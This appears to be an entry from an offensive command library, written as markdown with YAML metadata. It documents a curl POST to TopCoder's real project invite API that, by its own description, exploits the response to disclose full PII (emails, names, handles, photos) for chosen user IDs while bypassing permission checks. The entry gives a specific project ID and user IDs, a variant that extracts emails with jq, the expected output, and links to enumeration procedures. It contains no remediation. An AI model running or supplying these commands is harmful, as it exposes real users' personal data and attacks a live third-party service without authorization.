---
data: >-
  curl -X POST
  "https://api.topcoder.com/v5/projects/13482/members/invite/?fields=id%2CprojectId%2CuserId%2Cemail%2Crole%2Cstatus%2CcreatedAt%2CupdatedAt%2CcreatedBy%2CupdatedBy%2Chandle%2CfirstName%2ClastName%2CphotoURL"
  -H "Authorization: Bearer TOKEN" -H "Content-Type: application/json" -d
  '{"userIds":[41008482, 41008483, 41008486, 41012377],"role":"customer"}'
tags:
  - disclosure
  - api-post
type: command
output: >-
  JSON response with user details including emails, names, handles, roles, and
  invitation status
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:17.337Z'
id: ae8fa5e8-a235-4bcc-b948-0ce6e0faf401
verified: false
validated: true
submitted: true
---
# topcoder-project-invite-disclose

## Command

```bash
curl -X POST "https://api.topcoder.com/v5/projects/13482/members/invite/?fields=id%2CprojectId%2CuserId%2Cemail%2Crole%2Cstatus%2CcreatedAt%2CupdatedAt%2CcreatedBy%2CupdatedBy%2Chandle%2CfirstName%2ClastName%2CphotoURL" -H "Authorization: Bearer TOKEN" -H "Content-Type: application/json" -d '{"userIds":[41008482, 41008483, 41008486, 41012377],"role":"customer"}'
```

## Description

This command sends a bulk invite request to the TopCoder project API, exploiting response data to disclose full PII for provided user IDs, bypassing permission checks on user details.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `userIds` | Array of numeric user IDs to query/invite | Yes |
| `role` | Role to assign, e.g., "customer" | Yes |
| `fields` | Comma-separated response fields including email, handle, etc. | Yes |
| `projectId` | Target project ID in URL path | Yes |
| `Authorization` | Bearer token | Yes |

## Examples

### Basic Usage

```bash
curl -X POST "https://api.topcoder.com/v5/projects/123/members/invite/?fields=userId,email" -H "Authorization: Bearer TOKEN" -H "Content-Type: application/json" -d '{"userIds":[12345],"role":"member"}'
```

### Advanced Usage

```bash
curl -X POST "https://api.topcoder.com/v5/projects/13482/members/invite/?fields=id,projectId,userId,email,role,status,createdAt,updatedAt,createdBy,updatedBy,handle,firstName,lastName,photoURL" -H "Authorization: Bearer TOKEN" -H "Content-Type: application/json" -d '{"userIds":[41008482, 41008483],"role":"customer"}' | jq '.[].email'
```

## Expected Output

JSON array of invitation objects with embedded PII, e.g., {"result": [{"userId": 41008482, "email": "full@email.com", "handle": "user1", "role": "customer"}]}.

## Related

- [[commands/topcoder-member-search-enumerate]]
- [[procedures/Disclose-PII-via-Project-Invite-Endpoint]]
